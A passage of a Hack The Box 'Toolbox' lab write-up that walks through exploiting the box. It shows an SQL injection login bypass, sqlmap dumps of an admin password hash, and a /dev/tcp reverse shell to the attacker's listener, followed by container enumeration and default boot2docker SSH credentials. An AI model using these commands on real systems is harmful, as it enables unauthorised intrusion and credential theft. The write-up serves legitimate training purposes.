+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/domain-contact-page.png" alt="Domain 'Contact' page" /></p>
+<p>There's not much to say about them... they're seemingly part of a template, and they haven't been edited. They are just filled with 'Lorem ipsum'.</p>
+<p>There's only two functionalities that could be interesting to us.</p>
+<p>The first is the newsletter subscription located in the footer of every web page. However, if we inspect this form, we realize that it just sends a POST request to <code>#</code>, so nothing happens.</p>
+<p>The second is the contact form in the 'Contact' web page. But once again, if we inspect this form, we realize that it just sends a POST request to <code>#</code>, so nothing happens.</p>
+<h3 id="site-crawling">Site crawling</h3>
+<p>Let's crawl the website to see there are hidden files and directories.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> katana<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> https://megalogistic.com/</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[INF] Started standard crawling for =&gt; https://megalogistic.com/
+</span><span class="z-text z-plain">https://megalogistic.com/
+</span><span class="z-text z-plain">https://megalogistic.com/js/aos.js
+</span><span class="z-text z-plain">https://megalogistic.com/js/main.js
+</span><span class="z-text z-plain">https://megalogistic.com/js/jquery.stellar.min.js
+</span><span class="z-text z-plain">https://megalogistic.com/js/jquery.countdown.min.js
+</span><span class="z-text z-plain">https://megalogistic.com/js/jquery-migrate-3.0.1.min.js
+</span><span class="z-text z-plain">https://megalogistic.com/js/popper.min.js
+</span><span class="z-text z-plain">https://megalogistic.com/js/owl.carousel.min.js
+</span><span class="z-text z-plain">https://megalogistic.com/js/bootstrap-datepicker.min.js
+</span><span class="z-text z-plain">https://megalogistic.com/js/jquery-ui.js
+</span><span class="z-text z-plain">https://megalogistic.com/js/jquery.magnific-popup.min.js
+</span><span class="z-text z-plain">https://megalogistic.com/js/bootstrap.min.js
+</span><span class="z-text z-plain">https://megalogistic.com/js/jquery-3.3.1.min.js
+</span><span class="z-text z-plain">https://megalogistic.com/css/style.css
+</span><span class="z-text z-plain">https://megalogistic.com/css/aos.css
+</span><span class="z-text z-plain">https://megalogistic.com/css/bootstrap-datepicker.css
+</span><span class="z-text z-plain">https://megalogistic.com/fonts/flaticon/font/flaticon.css
+</span><span class="z-text z-plain">https://megalogistic.com/css/owl.theme.default.min.css
+</span><span class="z-text z-plain">https://megalogistic.com/css/owl.carousel.min.css
+</span><span class="z-text z-plain">https://megalogistic.com/css/magnific-popup.css
+</span><span class="z-text z-plain">https://megalogistic.com/booking.html
+</span><span class="z-text z-plain">https://megalogistic.com/css/jquery-ui.css
+</span><span class="z-text z-plain">https://megalogistic.com/contact.html
+</span><span class="z-text z-plain">https://megalogistic.com/services.html
+</span><span class="z-text z-plain">https://megalogistic.com/industries.html
+</span><span class="z-text z-plain">https://megalogistic.com/fonts/icomoon/style.css
+</span><span class="z-text z-plain">https://megalogistic.com/blog.html
+</span><span class="z-text z-plain">https://megalogistic.com/index.html
+</span><span class="z-text z-plain">https://megalogistic.com/css/bootstrap.min.css
+</span><span class="z-text z-plain">https://megalogistic.com/about.html
+</span></code></pre>
+<p>The <code>main.js</code> file at <code>/js/</code> could be interesting, but if we retrieve its content we see that it isn't.</p>
+<p>Nothing.</p>
+<h3 id="directory-fuzzing">Directory fuzzing</h3>
+<p>Let's see if we can find unliked web pages and directories.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ffuf<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> https://megalogistic.com/FUZZ<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>e</span> .php</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's see if we can find unliked files.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ffuf<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> https://megalogistic.com/FUZZ<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>maxtime</span> 60</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 26ms]
+</span><span class="z-text z-plain">| URL | https://megalogistic.com/images
+</span><span class="z-text z-plain">| --&gt; | https://megalogistic.com/images/
+</span><span class="z-text z-plain">    * FUZZ: images
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 27ms]
+</span><span class="z-text z-plain">| URL | https://megalogistic.com/css
+</span><span class="z-text z-plain">| --&gt; | https://megalogistic.com/css/
+</span><span class="z-text z-plain">    * FUZZ: css
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 27ms]
+</span><span class="z-text z-plain">| URL | https://megalogistic.com/js
+</span><span class="z-text z-plain">| --&gt; | https://megalogistic.com/js/
+</span><span class="z-text z-plain">    * FUZZ: js
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | https://megalogistic.com/fonts
+</span><span class="z-text z-plain">| --&gt; | https://megalogistic.com/fonts/
+</span><span class="z-text z-plain">    * FUZZ: fonts
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 22357, Words: 6240, Lines: 522, Duration: 459ms]
+</span><span class="z-text z-plain">| URL | https://megalogistic.com/
+</span><span class="z-text z-plain">    * FUZZ: 
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 403, Size: 282, Words: 20, Lines: 10, Duration: 102ms]
+</span><span class="z-text z-plain">| URL | https://megalogistic.com/server-status
+</span><span class="z-text z-plain">    * FUZZ: server-status
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>There's nothing unusual.</p>
+<p>But this is not surprising. We found out in the <a href="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/#scripts">Scripts</a> section the existence of a subdomain, named <code>admin.megalogistic.com</code>. The <code>admin</code> part is promising, and much more likely to give us a foothold — I just explored this domain for the sake of comprehensiveness, and in case the subdomain was a bait.</p>
+<h3 id="admin-megalogistic-com-subdomain"><code>admin.megalogistic.com</code> subdomain</h3>
+<p>Let's browse to <code>https://admin.megalogistic.com/</code> and see what we get.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/subdomain-homepage.png" alt="Subdomain homepage" /></p>
+<p>We stumble across a form... and the 'Sign in' header indicates that this is a log in one!</p>
+<h3 id="common-credentials-1">Common credentials</h3>
+<p>I tried to log in using common credentials, but that was unsuccessful.</p>
+<h3 id="sqli">SQLi</h3>
+<h4 id="test">Test</h4>
+<p>Let's try to enter <code>foo'</code> as the username and <code>foo</code> as the password.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/subdomain-homepage-sqli-first-test.png" alt="Subdomain homepage after filling form with the first SQLi test payload" /></p>
+<p>It's kinda hard to read, but there's a message at the top of the web page indicating that an error was encountered, so this form is vulnerable to SQLi!</p>
+<p>It specifies that the error occured in <code>/var/www/admin/index.php</code> on line <code>10</code>, in the <code>pg_query()</code> function. This is a function used to execute a PostgreSQL request, so now we know that the backend is using this database.</p>
+<h4 id="query">Query</h4>
+<p>It also discloses a part of the SQL query, so we can assume that it looks like that:</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql"><span class="z-keyword z-other z-DML z-sql">SELECT</span> <span class="z-variable z-language z-star z-sql">*</span> <span class="z-keyword z-other z-DML z-sql">FROM</span> users <span class="z-keyword z-other z-DML z-sql">WHERE</span> username <span class="z-keyword z-operator z-comparison z-sql">=</span> <span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>&lt;USERNAME&gt;<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span> <span class="z-keyword z-operator z-logical z-sql">AND</span> password <span class="z-keyword z-operator z-comparison z-sql">=</span> md5(<span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span>&lt;PASSWORD&gt;<span class="z-punctuation z-definition z-string z-end z-sql">&#39;</span></span>);
+</span></code></pre>
+<p>Therefore, we should be able to easily bypass it by entering:</p>
+<pre data-lang="sql" class="language-sql z-code"><code class="language-sql" data-lang="sql"><span class="z-source z-sql">foo<span class="z-string z-quoted z-single z-sql"><span class="z-punctuation z-definition z-string z-begin z-sql">&#39;</span> OR 1=1 -- -
+</span></span></code></pre>
+<h4 id="testing">Testing</h4>
+<p>Let's try it with a random password!</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/subdomain-dashboard-page.png" alt="Subdomain 'Dashboard' page" /></p>
+<p>It worked! We got access to a dashboard.</p>
+<h3 id="exploration-1">Exploration</h3>
+<p>This dashboard is composed of three pages. The 'Dashboard' page contains a general view of various information. It indiactes the server status, and the content of a todo-list. Apparently, <code>Administrator</code> still has to 'Send credentials to Tony' and 'Update Printer Drivers'...</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/subdomain-orders-page.png" alt="Subdomain 'Orders' page" /></p>
+<p>The 'Orders' page is comprised of a table of orders. It's not really interesting.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/subdomain-contact-page.png" alt="Subdomain 'Contact' page" /></p>
+<p>The 'Contact' page indicates that this dashboard has been developed by <code>MegaCorp</code>, and is version <code>1.0.0</code>.</p>
+<p>This means that this is a custom dashboard, so maybe there's vulnerabilities here... but there's no real functionalities to try to abuse.</p>
+<p>But maybe the database used to store credentials contains information?</p>
+<h2 id="postgresql-through-apache">PostgreSQL (through Apache)</h2>
+<p>Let's explore the PostgreSQL database we got access to using our SQLi.</p>
+<p>Since this is an error-based SQLi, it's really hard to exploit by hand, and time-comsuing to develop a script for it. Therefore, I'll use the good old <code>sqlmap</code> to make things easier.</p>
+<p>But first, I'll check the content of the first unsuccessful login request I made to <code>https://admin.megalogistic.com/</code>, and I'll save it in <code>/workspace/login_request</code>.</p>
+<h3 id="version">Version</h3>
+<p>Let's find out the version of PostgreSQL in use.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> sqlmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span> /workspace/login_request<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> username<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>technique</span> E<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>dbms</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>PostgreSQL<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>batch</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>force-ssl</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>banner</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">banner: &#39;PostgreSQL 11.7 (Debian 11.7-0+deb10u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit&#39;
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>So this is PostgreSQL version <code>11.7</code>!</p>
+<h3 id="databases">Databases</h3>
+<p>Now, let's see which databases are available.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> sqlmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span> /workspace/login_request<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> username<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>technique</span> E<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>dbms</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>PostgreSQL<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>batch</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>force-ssl</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>dbs</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">available databases [3]:
+</span><span class="z-text z-plain">[*] information_schema
+</span><span class="z-text z-plain">[*] pg_catalog
+</span><span class="z-text z-plain">[*] public
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>public</code> oen is the most interesting.</p>
+<h3 id="public-s-tables"><code>public</code>'s tables</h3>
+<p>Let's see which tables are included in this database.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> sqlmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span> /workspace/login_request<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> username<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>technique</span> E<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>dbms</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>PostgreSQL<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>batch</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>force-ssl</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>D</span> public<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>tables</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Database: public
+</span><span class="z-text z-plain">[1 table]
+</span><span class="z-text z-plain">+-------+
+</span><span class="z-text z-plain">| users |
+</span><span class="z-text z-plain">+-------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>So there's a single table named <code>users</code>.</p>
+<h3 id="users-s-columns"><code>users</code>'s columns</h3>
+<p>Let's continue our enumeration of this database by checking the content of the table we discovered.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> sqlmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span> /workspace/login_request<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> username<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>technique</span> E<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>dbms</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>PostgreSQL<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>batch</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>force-ssl</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>D</span> public<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>T</span> users<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>columns</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Database: public
+</span><span class="z-text z-plain">Table: users
+</span><span class="z-text z-plain">[2 columns]
+</span><span class="z-text z-plain">+----------+---------+
+</span><span class="z-text z-plain">| Column   | Type    |
+</span><span class="z-text z-plain">+----------+---------+
+</span><span class="z-text z-plain">| password | varchar |
+</span><span class="z-text z-plain">| username | varchar |
+</span><span class="z-text z-plain">+----------+---------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Okay, so this table contains two columns: <code>password</code> and <code>username</code>.</p>
+<h3 id="users-s-columns-content"><code>users</code>'s columns content</h3>
+<p>Let's retrieve the content of the <code>password</code> and <code>username</code> columns.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> sqlmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span> /workspace/login_request<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> username<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>technique</span> E<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>dbms</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>PostgreSQL<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>batch</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>force-ssl</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>D</span> public<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>T</span> users<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>C</span> password,username<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>dump</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Database: public
+</span><span class="z-text z-plain">Table: users
+</span><span class="z-text z-plain">[1 entry]
+</span><span class="z-text z-plain">+----------------------------------+----------+
+</span><span class="z-text z-plain">| password                         | username |
+</span><span class="z-text z-plain">+----------------------------------+----------+
+</span><span class="z-text z-plain">| 4a100a85cb5ca3616dcf137918550815 | admin    |
+</span><span class="z-text z-plain">+----------------------------------+----------+
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>We find an entry named <code>admin</code>, and a corresponding MD5 hash!</p>
+<h3 id="hash-cracking">Hash cracking</h3>
+<p>Let's enter the hash we got on <a href="https://crackstation.net/">Crackstation</a>. Here's the result:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/toolbox/crackstation-result-admin-password.png" alt="CrackStation result for the 'admin' password we got" /></p>
+<p>Unfortunately, no plaintext password was found.</p>
+<h1 id="foothold-sqli">Foothold (SQLi)</h1>
+<p>We weren't able to retrieve the plaintext version of the MD5 hash we found. But we can still use our SQLi to obtain a shell!</p>
+<h2 id="preparation">Preparation</h2>
+<p>The goal is to obtain a reverse shell. To that end, I'll use <a href="https://www.revshells.com/">this website</a> to find appropriate payloads.</p>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> 9001</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">listening on [any] 9001 ...
+</span></code></pre>
+<p>Then, I'll choose a payload from the last website (slightly modified) to initiate the connection to the listener:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">sh</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>i</span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&amp;</span> /dev/tcp/10.10.14.6/9001 <span class="z-constant z-numeric z-integer z-decimal z-file-descriptor z-shell">0</span><span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&amp;</span><span class="z-constant z-numeric z-integer z-decimal z-file-descriptor z-shell">1</span></span>
+</span></code></pre>
+<h2 id="exploitation">Exploitation</h2>
+<p>Time to use <code>sqlmap</code> to execute our reverse shell command! Note that I removed <code>--technique E</code> from the command, since apparently it's not possible to execute commands on the backend DBMS using this injection technique. Luckily for us, the server is vulnerable to other injection techniques.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> sqlmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span> /workspace/login_request<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> username<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>dbms</span><span class="z-keyword z-operator z-assignment z-option z-shell">=</span>PostgreSQL<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>batch</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>force-ssl</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>os-cmd</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/bin/bash -c &#39;sh -i &gt;&amp; /dev/tcp/10.10.14.6/9001 0&gt;&amp;1&#39;<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>And on the listener...</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.6] from (UNKNOWN) [10.10.10.236] 49796
+</span><span class="z-text z-plain">sh: 0: can&#39;t access tty; job control turned off
+</span><span class="z-text z-plain">$
+</span></code></pre>
+<p>It caught the shell. Nice!</p>
+<p>Our shell is not really interactive though, so I'll run this one-liner to stabilize it a bit:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">$</span></span><span class="z-meta z-function-call z-arguments z-shell"> python3<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span> <span class="z-string z-quoted z-single z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&#39;</span>import pty; pty.spawn(&quot;/bin/bash&quot;)<span class="z-punctuation z-definition z-string z-end z-shell">&#39;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$
+</span></code></pre>
+<p>That's much better!</p>
+<h1 id="local-enumeration">Local enumeration</h1>
+<p>If we run <code>whoami</code>, we see that we got access as <code>postgres</code>.</p>
+<h2 id="distribution">Distribution</h2>
+<p>Let's see which distribution this container is using.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat /etc/os-release</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">PRETTY_NAME=&quot;Debian GNU/Linux 10 (buster)&quot;
+</span><span class="z-text z-plain">NAME=&quot;Debian GNU/Linux&quot;
+</span><span class="z-text z-plain">VERSION_ID=&quot;10&quot;
+</span><span class="z-text z-plain">VERSION=&quot;10 (buster)&quot;
+</span><span class="z-text z-plain">VERSION_CODENAME=buster
+</span><span class="z-text z-plain">ID=debian
+</span><span class="z-text z-plain">HOME_URL=&quot;https://www.debian.org/&quot;
+</span><span class="z-text z-plain">SUPPORT_URL=&quot;https://www.debian.org/support&quot;
+</span><span class="z-text z-plain">BUG_REPORT_URL=&quot;https://bugs.debian.org/&quot;
+</span></code></pre>
+<p>So this is Debian 10, okay. That's pretty recent, so we're unlikely to find vulnerabilities here.</p>
+<h2 id="architecture">Architecture</h2>
+<p>What is this container's architecture?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">x86_64
+</span></code></pre>
+<p>So this system is using x64. This will be useful to know if we want to compile our own exploits.</p>
+<h2 id="kernel">Kernel</h2>
+<p>Maybe this container is vulnerable to a kernel exploit?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>r</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">4.14.154-boot2docker
+</span></code></pre>
+<p>Hmmm... that's unusual. What is <code>boot2docker</code>?</p>
+<blockquote>
+<p>Boot2Docker is a lightweight Linux distribution made specifically to run Docker containers. It runs completely from RAM, is a ~45MB download and boots quickly.</p>
+<p>— <a href="https://github.com/boot2docker/boot2docker">GitHub</a></p>
+</blockquote>
+<p>This confirms that we are inside a Docker container, this technology is probably used by Docker Toolbox. But I wonder... can we do anything with this information?</p>
+<p>If we read the README of the GitHub page, we find a <a href="https://github.com/boot2docker/boot2docker#ssh-into-vm">section about SSH</a>. Apparently, the default credentials used to SSH into the VM are <code>docker</code>:<code>tcuser</code>. Maybe we can try them?</p>
+<p>There's one issue though: we don't know the IP of the VM. But maybe we can find it?</p>
+<h2 id="nics">NICs</h2>
+<p>Let's gather the list of connected NICs. I tried to use <code>ip</code>, but it's not installed, so I'll use <code>ifconfig</code> instead:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$</span></span><span class="z-meta z-function-call z-arguments z-shell"> ifconfig<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span></span>
+</span></code></pre>
